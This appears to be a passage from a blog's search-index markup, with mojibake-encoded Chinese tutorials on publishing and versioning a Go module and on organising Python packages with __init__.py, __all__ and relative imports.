&lt;pre&gt;&lt;code class=&#34;language-mod&#34;&gt;module github.com/xxx/encodex

go 1.13
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç„¶ååœ¨åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹(package)hashï¼Œç„¶ååˆ›å»ºä¸€ä¸ªhash.goæ–‡ä»¶ï¼Œæ·»åŠ ä»£ç ï¼Œè¿™æ ·å°±å¯ä»¥å½“ä½œä¸€ä¸ªmoduleä½¿ç”¨äº†ï¼Œä¹Ÿå¯ä»¥æŠŠè¿™ä¸ªmoduleå‘å¸ƒåˆ°githubä¸Šã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆéœ€è¦åœ¨githubä¸Šåˆ›å»ºä»£ç ä»“åº“ï¼Œç„¶åå°†æœ¬åœ°ä»£ç pushä¸Šå»ï¼Œåœ¨å‘å¸ƒä¹‹å‰ï¼Œéœ€è¦ç»™moduleæŒ‡å®šè¯­ä¹‰åŒ–ç‰ˆæœ¬ï¼Œä¸€èˆ¬ç”±å­—ç¬¦&lt;code&gt;vMajor.Minor.patch&lt;/code&gt;æ„æˆï¼Œ&lt;code&gt;v&lt;/code&gt;æ˜¯å›ºå®šå­—ç¬¦ï¼Œ&lt;code&gt;Major&lt;/code&gt;ä»£è¡¨ä¸»ç‰ˆæœ¬ï¼Œ&lt;code&gt;Minor&lt;/code&gt;ä»£è¡¨æ­¤ç‰ˆæœ¬ï¼Œ&lt;code&gt;Patch&lt;/code&gt;ä»£è¡¨ä¸å®šç‰ˆæœ¬ã€‚åªæœ‰åœ¨ç‰ˆæœ¬ä¸å…¼å®¹ä¹‹å‰ç‰ˆæœ¬æ—¶ï¼Œæ‰ä¼šæ”¹åŠ¨ä¸»ç‰ˆæœ¬å·ï¼Œå½“å…¼å®¹æ—¶åªæ”¹åŠ¨æ¬¡ç‰ˆæœ¬å·ï¼Œå½“å¯¹æ­¤ç‰ˆæœ¬åšäº†é—®é¢˜çš„ä¿®å¤æ—¶ä¼šæ”¹åŠ¨patchã€‚å¯¹äºgitçš„æ¯æ¬¡æäº¤éƒ½å¯ä»¥ä¸ºå…¶åˆ›å»ºä¸€ä¸ªè¯­ä¹‰åŒ–ç‰ˆæœ¬åï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git tag v1.0.0

git push --tag
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åˆ°è¿™é‡Œmoduleå°±å‘å¸ƒæˆåŠŸäº†ã€‚&lt;/p&gt;
&lt;h3 id=&#34;ç¬¬ä¸‰æ–¹moduleçš„ä½¿ç”¨&#34;&gt;ç¬¬ä¸‰æ–¹moduleçš„ä½¿ç”¨&lt;/h3&gt;
&lt;p&gt;æ¥ç€ï¼Œæˆ‘ä»¬åœ¨å½“å‰ç›®å½•ä¸‹æ–°å»ºæ–‡ä»¶ &lt;code&gt;main/main.go&lt;/code&gt;ï¼Œæ·»åŠ å¦‚ä¸‹ä»£ç ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main

import (
	&amp;quot;fmt&amp;quot;

	&amp;quot;github.com/xxx/encodex/hash&amp;quot;
)

func main() {
	...
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿è¡Œ&lt;code&gt;go get github.com/xxx/encodex/hash@v1.0.0&lt;/code&gt;ï¼Œå¯ä»¥æŒ‡å®šåŒ…çš„å…·ä½“ç‰ˆæœ¬ï¼Œä¹Ÿå¯ä»¥ä¸æŒ‡å®šï¼Œä¸æŒ‡å®šå°±ä¼šä¸‹è½½æœ€æ–°ç‰ˆæœ¬ã€‚&lt;/p&gt;
&lt;p&gt;go.modæ–‡ä»¶ä¸­ä¼šå¢åŠ ä¸€æ¡è¯­å¥&lt;code&gt;require github.com/xxx/encodex v1.0.0&lt;/code&gt;ï¼Œä¸‹è½½çš„åŒ…ä¼šå­˜å‚¨åœ¨&lt;code&gt;GOPATH/pkg/mod/github.com/xxx/encodex&lt;/code&gt;ä¸‹ã€‚&lt;/p&gt;
&lt;h3 id=&#34;ä¾èµ–åŒ…ç‰ˆæœ¬å‡çº§&#34;&gt;ä¾èµ–åŒ…ç‰ˆæœ¬å‡çº§&lt;/h3&gt;
&lt;p&gt;æ—¶é—´é•¿äº†é¡¹ç›®æ‰€ä¾èµ–çš„ç¬¬ä¸‰æ–¹åŒ…å¯èƒ½ä¼šæœ‰æ–°çš„å‡çº§ï¼Œæ¯”å¦‚ä¿®å¤äº†ä¸€ä¸ªbugã€‚å¦‚æœæˆ‘ä»¬åªæƒ³å‡çº§è¡¥ä¸ç‰ˆæœ¬pathï¼Œåˆ™å¯ä»¥ä½¿ç”¨å‘½ä»¤&lt;code&gt;go get -u=patch&lt;/code&gt;ï¼›å¦‚æœæ˜¯æƒ³æ›´æ–°æ¬¡ç‰ˆæœ¬å·ï¼Œç›´æ¥ä½¿ç”¨&lt;code&gt;go get -u&lt;/code&gt;ï¼Œè¯¥å‘½ä»¤å¦‚æœæ¬¡ç‰ˆæœ¬æœ‰å‡çº§ä¼šå‡çº§æ¬¡ç‰ˆæœ¬ï¼Œå¦‚æœæ²¡æœ‰æ¬¡ç‰ˆæœ¬åˆ™å‡çº§è¡¥ä¸ç‰ˆæœ¬ã€‚å¦‚æœæƒ³å‡çº§åˆ°æŒ‡å®šç‰ˆæœ¬å¯ä»¥ä½¿ç”¨&lt;code&gt;go get module@version&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœæƒ³å‡çº§å¤§ç‰ˆæœ¬ï¼Œå› ä¸ºä¸€ä¸ªå¤§çš„ç‰ˆæœ¬å’Œä¹‹å‰çš„ç‰ˆæœ¬ä¸å…¼å®¹ï¼Œæ‰€ä»¥goä¼šè®¤ä¸ºæ˜¯ä¸€ä¸ªå…¨æ–°çš„moduleï¼Œå› æ­¤éœ€è¦åœ¨ä»£ç ä¸­importå¯¹åº”çš„æ–°ç‰ˆæœ¬ï¼Œå¹¶ä½¿ç”¨&lt;code&gt;go get&lt;/code&gt;é‡æ–°ä¸‹è½½ã€‚&lt;/p&gt;
&lt;p&gt;https://blog.csdn.net/RA681t58CJxsgCkJ31/article/details/123911038&lt;/p&gt;
">ã€goã€‘go moduleç‰ˆæœ¬ç®¡ç†</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/python-mo-kuai-he-bao-guan-li/"" data-c="
          &lt;h2 id=&#34;1-æ„å»ºä¸€ä¸ªæ¨¡å—çš„å±‚çº§åŒ…&#34;&gt;1 æ„å»ºä¸€ä¸ªæ¨¡å—çš„å±‚çº§åŒ…&lt;/h2&gt;
&lt;p&gt;å°è£…æˆåŒ…æ˜¯å¾ˆç®€å•çš„ã€‚åœ¨æ–‡ä»¶ç³»ç»Ÿä¸Šç»„ç»‡ä½ çš„ä»£ç ï¼Œå¹¶ç¡®ä¿æ¯ä¸ªç›®å½•éƒ½å®šä¹‰äº†ä¸€ä¸ª&lt;code&gt;__init__.py&lt;/code&gt;æ–‡ä»¶ã€‚ ä¾‹å¦‚ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;graphics/
    __init__.py
    primitive/
        __init__.py
        line.py
        fill.py
        text.py
    formats/
        __init__.py
        png.py
        jpg.py
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸€æ—¦ä½ åšåˆ°äº†è¿™ä¸€ç‚¹ï¼Œä½ åº”è¯¥èƒ½å¤Ÿæ‰§è¡Œå„ç§importè¯­å¥ï¼Œå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import graphics.primitive.line
from graphics.primitive import line
import graphics.formats.jpg as jpg
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;è®¨è®º&#34;&gt;è®¨è®º&lt;/h3&gt;
&lt;p&gt;å®šä¹‰æ¨¡å—çš„å±‚æ¬¡ç»“æ„å°±åƒåœ¨æ–‡ä»¶ç³»ç»Ÿä¸Šå»ºç«‹ç›®å½•ç»“æ„ä¸€æ ·å®¹æ˜“ã€‚ æ–‡ä»¶&lt;code&gt;__init__.py&lt;/code&gt;çš„ç›®çš„æ˜¯è¦åŒ…å«ä¸åŒè¿è¡Œçº§åˆ«çš„åŒ…çš„å¯é€‰çš„åˆå§‹åŒ–ä»£ç ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœä½ æ‰§è¡Œäº†è¯­å¥&lt;code&gt;import graphics&lt;/code&gt;ï¼Œ æ–‡ä»¶&lt;code&gt;graphics/__init__.py&lt;/code&gt;å°†è¢«å¯¼å…¥ï¼Œå»ºç«‹&lt;code&gt;graphics&lt;/code&gt;å‘½åç©ºé—´çš„å†…å®¹ã€‚åƒ&lt;code&gt;import graphics.format.jpg&lt;/code&gt;è¿™æ ·å¯¼å…¥ï¼Œæ–‡ä»¶&lt;code&gt;graphics/__init__.py&lt;/code&gt;å’Œæ–‡ä»¶&lt;code&gt;graphics/formats/__init__.py&lt;/code&gt;å°†åœ¨æ–‡ä»¶&lt;code&gt;graphics/formats/jpg.py&lt;/code&gt;å¯¼å…¥ä¹‹å‰å¯¼å…¥ã€‚&lt;/p&gt;
&lt;p&gt;ç»å¤§éƒ¨åˆ†æ—¶å€™è®©&lt;code&gt;__init__.py&lt;/code&gt;ç©ºç€å°±å¥½ï¼Œä½†æ˜¯æœ‰äº›æƒ…å†µä¸‹å¯èƒ½åŒ…å«ä»£ç ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œ&lt;code&gt;__init__.py&lt;/code&gt;èƒ½å¤Ÿç”¨æ¥è‡ªåŠ¨åŠ è½½å­æ¨¡å—:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# graphics/formats/__init__.py
from . import jpg
from . import png
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åƒè¿™æ ·ä¸€ä¸ªæ–‡ä»¶,ç”¨æˆ·å¯ä»¥ä»…ä»…é€šè¿‡&lt;code&gt;import grahpics.formats&lt;/code&gt;æ¥ä»£æ›¿&lt;code&gt;import graphics.formats.jpg&lt;/code&gt;ä»¥åŠ&lt;code&gt;import graphics.formats.png&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;__init__.py&lt;/code&gt;çš„å…¶ä»–å¸¸ç”¨ç”¨æ³•åŒ…æ‹¬å°†å¤šä¸ªæ–‡ä»¶åˆå¹¶åˆ°ä¸€ä¸ªé€»è¾‘å‘½åç©ºé—´ï¼Œè¿™å°†åœ¨4å°èŠ‚è®¨è®ºã€‚&lt;/p&gt;
&lt;p&gt;æ•é”çš„ç¨‹åºå‘˜ä¼šå‘ç°ï¼Œå³ä½¿æ²¡æœ‰&lt;code&gt;__init__.py&lt;/code&gt;æ–‡ä»¶å­˜åœ¨ï¼Œpythonä»ç„¶ä¼šå¯¼å…¥åŒ…ã€‚å¦‚æœä½ æ²¡æœ‰å®šä¹‰&lt;code&gt;__init__.py&lt;/code&gt;æ—¶ï¼Œå®é™…ä¸Šåˆ›å»ºäº†ä¸€ä¸ªæ‰€è°“çš„â€œå‘½åç©ºé—´åŒ…â€ï¼Œè¿™å°†åœ¨5å°èŠ‚è®¨è®ºã€‚å¦‚æœä½ ç€æ‰‹åˆ›å»ºä¸€ä¸ªæ–°çš„åŒ…çš„è¯ï¼ŒåŒ…å«ä¸€ä¸ª&lt;code&gt;__init__.py&lt;/code&gt;æ–‡ä»¶å§ã€‚&lt;/p&gt;
&lt;h2 id=&#34;2-æ§åˆ¶æ¨¡å—è¢«å…¨éƒ¨å¯¼å…¥çš„å†…å®¹&#34;&gt;2 æ§åˆ¶æ¨¡å—è¢«å…¨éƒ¨å¯¼å…¥çš„å†…å®¹&lt;/h2&gt;
&lt;p&gt;å½“ä½¿ç”¨&lt;code&gt;from module import *&lt;/code&gt;è¯­å¥æ—¶ï¼Œå¸Œæœ›å¯¹ä»æ¨¡å—æˆ–åŒ…å¯¼å‡ºçš„ç¬¦å·è¿›è¡Œé™åˆ¶ï¼Œå³åªå¯¼å‡ºéƒ¨åˆ†å†…å®¹ã€‚&lt;/p&gt;
&lt;p&gt;å¯ä»¥å®šä¹‰ä¸€ä¸ªå˜é‡&lt;code&gt;__all__&lt;/code&gt;æ¥æ˜ç¡®åœ°åˆ—å‡ºéœ€è¦å¯¼å‡ºçš„å†…å®¹ã€‚&lt;/p&gt;
&lt;p&gt;ä¸¾ä¸ªä¾‹å­:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# somemodule.py
def spam():
    pass

def grok():
    pass

blah = 42
# Only export &#39;spam&#39; and &#39;grok&#39;
__all__ = [&#39;spam&#39;, &#39;grok&#39;]
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;è®¨è®º-2&#34;&gt;è®¨è®º&lt;/h3&gt;
&lt;p&gt;å°½ç®¡å¼ºçƒˆåå¯¹ä½¿ç”¨&lt;code&gt;from module import *&lt;/code&gt;ï¼Œä½†æ˜¯åœ¨å®šä¹‰äº†å¤§é‡å˜é‡åçš„æ¨¡å—ä¸­é¢‘ç¹ä½¿ç”¨ã€‚å¦‚æœä½ ä¸åšä»»ä½•äº‹, è¿™æ ·çš„å¯¼å…¥å°†ä¼šå¯¼å…¥æ‰€æœ‰ä¸ä»¥ä¸‹åˆ’çº¿å¼€å¤´çš„ã€‚ å¦ä¸€æ–¹é¢,å¦‚æœå®šä¹‰äº†&lt;code&gt;__all__&lt;/code&gt; , é‚£ä¹ˆåªæœ‰è¢«åˆ—ä¸¾å‡ºçš„ä¸œè¥¿ä¼šè¢«å¯¼å‡ºã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœä½ å°†&lt;code&gt;__all__&lt;/code&gt;å®šä¹‰æˆä¸€ä¸ªç©ºåˆ—è¡¨ï¼Œæ²¡æœ‰ä¸œè¥¿å°†è¢«å¯¼å…¥ã€‚ å¦‚æœ&lt;code&gt;__all__&lt;/code&gt;åŒ…å«æœªå®šä¹‰çš„åå­—, åœ¨å¯¼å…¥æ—¶å¼•èµ·&lt;code&gt;AttributeError&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;h2 id=&#34;3-ä½¿ç”¨ç›¸å¯¹è·¯å¾„åå¯¼å…¥åŒ…ä¸­å­æ¨¡å—&#34;&gt;3 ä½¿ç”¨ç›¸å¯¹è·¯å¾„åå¯¼å…¥åŒ…ä¸­å­æ¨¡å—&lt;/h2&gt;
&lt;p&gt;å°†ä»£ç ç»„ç»‡æˆåŒ…ï¼Œæƒ³ç”¨importè¯­å¥ä»å¦ä¸€ä¸ªåŒ…åæ²¡æœ‰ç¡¬ç¼–ç è¿‡çš„åŒ…ä¸­å¯¼å…¥å­æ¨¡å—ã€‚&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨åŒ…çš„ç›¸å¯¹å¯¼å…¥ï¼Œä½¿ä¸€ä¸ªæ¨¡å—å¯¼å…¥åŒä¸€ä¸ªåŒ…çš„å¦ä¸€ä¸ªæ¨¡å—ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå‡è®¾æ–‡ä»¶ç»„ç»‡å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mypackage/
    __init__.py
    A/
        __init__.py
        spam.py
        grok.py
    B/
        __init__.py
        bar.py
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¦‚æœæ¨¡å—&lt;code&gt;mypackage.A.spam&lt;/code&gt;è¦å¯¼å…¥åŒç›®å½•ä¸‹çš„æ¨¡å—&lt;code&gt;grok&lt;/code&gt;ï¼Œå®ƒåº”è¯¥åŒ…æ‹¬çš„importè¯­å¥å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# mypackage/A/spam.py
from . import grok
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¦‚æœæ¨¡å—&lt;code&gt;mypackage.A.spam&lt;/code&gt;è¦å¯¼å…¥ä¸åŒç›®å½•ä¸‹çš„æ¨¡å—B.barï¼Œå®ƒåº”è¯¥ä½¿ç”¨çš„importè¯­å¥å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# mypackage/A/spam.py
from ..B import bar
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸¤ä¸ªimportè¯­å¥éƒ½æ²¡åŒ…å«é¡¶å±‚åŒ…åï¼Œè€Œæ˜¯ä½¿ç”¨äº†spam.pyçš„ç›¸å¯¹è·¯å¾„ã€‚&lt;/p&gt;
&lt;h3 id=&#34;è®¨è®º-3&#34;&gt;è®¨è®º&lt;/h3&gt;
&lt;p&gt;åœ¨åŒ…å†…ï¼Œæ—¢å¯ä»¥ä½¿ç”¨ç›¸å¯¹è·¯å¾„ä¹Ÿå¯ä»¥ä½¿ç”¨ç»å¯¹è·¯å¾„æ¥å¯¼å…¥ã€‚ ä¸¾ä¸ªä¾‹å­ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# mypackage/A/spam.py
from mypackage.A import grok # OK
from . import grok # OK
import grok # Error (not found)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;**åƒmypackage.Aè¿™æ ·ä½¿ç”¨ç»å¯¹è·¯å¾„åçš„ä¸åˆ©ä¹‹å¤„æ˜¯è¿™å°†é¡¶å±‚åŒ…åç¡¬ç¼–ç åˆ°ä½ çš„æºç ä¸­ã€‚**å¦‚æœä½ æƒ³é‡æ–°ç»„ç»‡å®ƒï¼Œä½ çš„ä»£ç å°†æ›´è„†ï¼Œå¾ˆéš¾å·¥ä½œã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœä½ æ”¹å˜äº†åŒ…åï¼Œä½ å°±å¿…é¡»æ£€æŸ¥æ‰€æœ‰æ–‡ä»¶æ¥ä¿®æ­£æºç ã€‚ åŒæ ·ï¼Œç¡¬ç¼–ç çš„åç§°ä¼šä½¿ç§»åŠ¨ä»£ç å˜å¾—å›°éš¾ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œä¹Ÿè®¸æœ‰äººæƒ³å®‰è£…ä¸¤ä¸ªä¸åŒç‰ˆæœ¬çš„è½¯ä»¶åŒ…ï¼Œåªé€šè¿‡åç§°åŒºåˆ†å®ƒä»¬ã€‚ å¦‚æœä½¿ç”¨ç›¸å¯¹å¯¼å…¥ï¼Œé‚£ä¸€åˆ‡éƒ½okï¼Œç„¶è€Œä½¿ç”¨ç»å¯¹è·¯å¾„åå¾ˆå¯èƒ½ä¼šå‡ºé—®é¢˜ã€‚&lt;/p&gt;
&lt;p&gt;importè¯­å¥çš„ &lt;code&gt;.&lt;/code&gt; å’Œ &lt;code&gt;..&lt;/code&gt; çœ‹èµ·æ¥å¾ˆæ»‘ç¨½, ä½†å®ƒæŒ‡å®šç›®å½•å.ä¸ºå½“å‰ç›®å½•ï¼Œ..Bä¸ºç›®å½•../Bã€‚è¿™ç§è¯­æ³•åªé€‚ç”¨äºimportã€‚ ä¸¾ä¸ªä¾‹å­ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from . import grok # OK
import .grok # ERROR
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;mark&gt;å°½ç®¡ä½¿ç”¨ç›¸å¯¹å¯¼å…¥çœ‹èµ·æ¥åƒæ˜¯æµè§ˆæ–‡ä»¶ç³»ç»Ÿï¼Œä½†æ˜¯ä¸èƒ½åˆ°å®šä¹‰åŒ…çš„ç›®å½•ä¹‹å¤–ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä½¿ç”¨ç‚¹çš„è¿™ç§æ¨¡å¼ä»ä¸æ˜¯åŒ…çš„ç›®å½•ä¸­å¯¼å…¥å°†ä¼šå¼•å‘é”™è¯¯ã€‚&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;å¦å¤–ï¼Œåªèƒ½å¯¼å…¥é¡¶å±‚æ¨¡å—ä¸‹çš„å†…éƒ¨æ¨¡å—ï¼Œä¸èƒ½å¯¼å…¥å’Œé¡¶å±‚æ¨¡å—ç›¸åŒç›®å½•çš„æ¨¡å—ï¼Œå¦‚æœåŒ…çš„éƒ¨åˆ†è¢«ä½œä¸ºè„šæœ¬ç›´æ¥æ‰§è¡Œï¼Œé‚£ç›¸å¯¹è·¯å¾„çš„å¯¼å…¥è¿™ç§æ–¹å¼å¯èƒ½ä¼šä¸èµ·ä½œç”¨ã€‚&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;ä¾‹å¦‚ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;% python3 mypackage/A/spam.py # Relative imports fail
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¦ä¸€æ–¹é¢ï¼Œå¦‚æœä½ ä½¿ç”¨Pythonçš„-mé€‰é¡¹æ¥æ‰§è¡Œå…ˆå‰çš„è„šæœ¬ï¼Œç›¸å¯¹å¯¼å…¥å°†ä¼šæ­£ç¡®è¿è¡Œã€‚ ä¾‹å¦‚ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;% python3 -m mypackage.A.spam # Relative imports work
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¹Ÿå°±æ˜¯è¯´&lt;strong&gt;åŒ…&lt;/strong&gt;ä¸­çš„æ–‡ä»¶(æ¨¡å—)ä¸èƒ½å•ç‹¬ä½œä¸ºä¸»å‡½æ•°è¿è¡Œã€‚ï¼ˆå¦‚æœä¸€ä¸ªæ¨¡å—è¢«ç›´æ¥è¿è¡Œï¼Œåˆ™æ­¤æ—¶å®ƒè‡ªå·±å°±æ˜¯é¡¶å±‚æ¨¡å—ï¼Œä¸å­˜åœ¨å±‚æ¬¡ç»“æ„ï¼Œæ‰€ä»¥æ‰¾ä¸åˆ°å’Œå…¶åŒå±‚çš„æ¨¡å—å’Œä¸Šå±‚æ¨¡å—ï¼Œä½†å¯ä»¥ä½¿ç”¨ç»å¯¹è·¯å¾„ï¼›å¦‚æœéè¦ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼ŒæŠŠéœ€è¦å¯¼å…¥çš„æ¨¡å—æ”¾åˆ°æ‰§è¡Œæ¨¡å—çš„å†…éƒ¨æ¨¡å—ï¼‰&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;from package_A import module_B/package_B&lt;/code&gt;ä¸­ï¼Œå…ˆæ‰§è¡Œçš„æ˜¯&lt;code&gt;package_A&lt;/code&gt;ä¸­çš„&lt;code&gt;__init__.py&lt;/code&gt;æ–‡ä»¶ï¼Œå†æ‰§è¡Œåé¢çš„&lt;code&gt;module_B&lt;/code&gt;æ–‡ä»¶æˆ–è€…&lt;code&gt;package_B&lt;/code&gt;ä¸­çš„&lt;code&gt;__init__.py&lt;/code&gt;æ–‡ä»¶ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;åœ¨é¡¶å±‚æ¨¡å—å†…éƒ¨çš„å„æ¨¡å—ï¼Œå¯ä»¥ç›¸å¯¹å¯¼å…¥ï¼›è¿™äº›æ¨¡å—å¯¹äºé¡¶å±‚æ¨¡å—åŒç›®å½•æˆ–è€…æ›´ä¸Šå±‚ç›®å½•åˆ™ä¸èƒ½ç›¸å¯¹å¯¼å…¥ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;æœ€åï¼Œä¸æ¨èä½¿ç”¨ç›¸å¯¹è·¯å¾„ã€‚&lt;/p&gt;
&lt;h2 id=&#34;4-å°†æ¨¡å—åˆ†å‰²æˆå¤šä¸ªæ–‡ä»¶&#34;&gt;4 å°†æ¨¡å—åˆ†å‰²æˆå¤šä¸ªæ–‡ä»¶&lt;/h2&gt;
&lt;p&gt;ä½ æƒ³å°†ä¸€ä¸ªæ¨¡å—åˆ†å‰²æˆå¤šä¸ªæ–‡ä»¶ã€‚ä½†æ˜¯ä½ ä¸æƒ³å°†åˆ†ç¦»çš„æ–‡ä»¶ç»Ÿä¸€æˆä¸€ä¸ªé€»è¾‘æ¨¡å—æ—¶ä½¿å·²æœ‰çš„ä»£ç é­åˆ°ç ´åã€‚&lt;/p&gt;
&lt;p&gt;ç¨‹åºæ¨¡å—å¯ä»¥é€šè¿‡å˜æˆåŒ…æ¥åˆ†å‰²æˆå¤šä¸ªç‹¬ç«‹çš„æ–‡ä»¶ã€‚è€ƒè™‘ä¸‹ä¸‹é¢ç®€å•çš„æ¨¡å—ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# mymodule.py
class A:
    def spam(self):
        print(&#39;A.spam&#39;)

class B(A):
    def bar(self):
        print(&#39;B.bar&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å‡è®¾ä½ æƒ³mymodule.pyåˆ†ä¸ºä¸¤ä¸ªæ–‡ä»¶ï¼Œæ¯ä¸ªå®šä¹‰çš„ä¸€ä¸ªç±»ã€‚è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œé¦–å…ˆç”¨mymoduleç›®å½•æ¥æ›¿æ¢æ–‡ä»¶mymodule.pyã€‚ è¿™è¿™ä¸ªç›®å½•ä¸‹ï¼Œåˆ›å»ºä»¥ä¸‹æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;mymodule/
    __init__.py
    a.py
    b.py
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨a.pyæ–‡ä»¶ä¸­æ’å…¥ä»¥ä¸‹ä»£ç ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# a.py
class A:
    def spam(self):
        print(&#39;A.spam&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨b.pyæ–‡ä»¶ä¸­æ’å…¥ä»¥ä¸‹ä»£ç ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# b.py
from .a import A
class B(A):
    def bar(self):
        print(&#39;B.bar&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æœ€åï¼Œåœ¨ &lt;code&gt;__init__.py&lt;/code&gt; ä¸­ï¼Œå°†2ä¸ªæ–‡ä»¶ç²˜åˆåœ¨ä¸€èµ·ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# __init__.py
from .a import A
from .b import B
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¦‚æœæŒ‰ç…§è¿™äº›æ­¥éª¤ï¼Œæ‰€äº§ç”Ÿçš„åŒ…MyModuleå°†ä½œä¸ºä¸€ä¸ªå•ä¸€çš„é€»è¾‘æ¨¡å—ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; import mymodule
&amp;gt;&amp;gt;&amp;gt; a = mymodule.A()
&amp;gt;&amp;gt;&amp;gt; a.spam()
A.spam
&amp;gt;&amp;gt;&amp;gt; b = mymodule.B()
&amp;gt;&amp;gt;&amp;gt; b.bar()
B.bar
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;è®¨è®º-4&#34;&gt;è®¨è®º&lt;/h3&gt;
&lt;p&gt;åœ¨è¿™ä¸ªç« èŠ‚ä¸­çš„ä¸»è¦é—®é¢˜æ˜¯ä¸€ä¸ªè®¾è®¡é—®é¢˜ï¼Œä¸ç®¡ä½ æ˜¯å¦å¸Œæœ›ç”¨æˆ·ä½¿ç”¨å¾ˆå¤šå°æ¨¡å—æˆ–åªæ˜¯ä¸€ä¸ªæ¨¡å—ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œåœ¨ä¸€ä¸ªå¤§å‹çš„ä»£ç åº“ä¸­ï¼Œä½ å¯ä»¥å°†è¿™ä¸€åˆ‡éƒ½åˆ†å‰²æˆç‹¬ç«‹çš„æ–‡ä»¶ï¼Œè®©ç”¨æˆ·ä½¿ç”¨å¤§é‡çš„importè¯­å¥ï¼Œå°±åƒè¿™æ ·ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from mymodule.a import A
from mymodule.b import B
...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™æ ·èƒ½å·¥ä½œï¼Œä½†è¿™è®©ç”¨æˆ·æ‰¿å—æ›´å¤šçš„è´Ÿæ‹…ï¼Œç”¨æˆ·è¦çŸ¥é“ä¸åŒçš„éƒ¨åˆ†ä½äºä½•å¤„ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œå°†è¿™äº›ç»Ÿä¸€èµ·æ¥ï¼Œä½¿ç”¨ä¸€æ¡importå°†æ›´åŠ å®¹æ˜“ï¼Œå°±åƒè¿™æ ·ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from mymodule import A, B
&lt;/code&gt;&lt;/pre&gt;
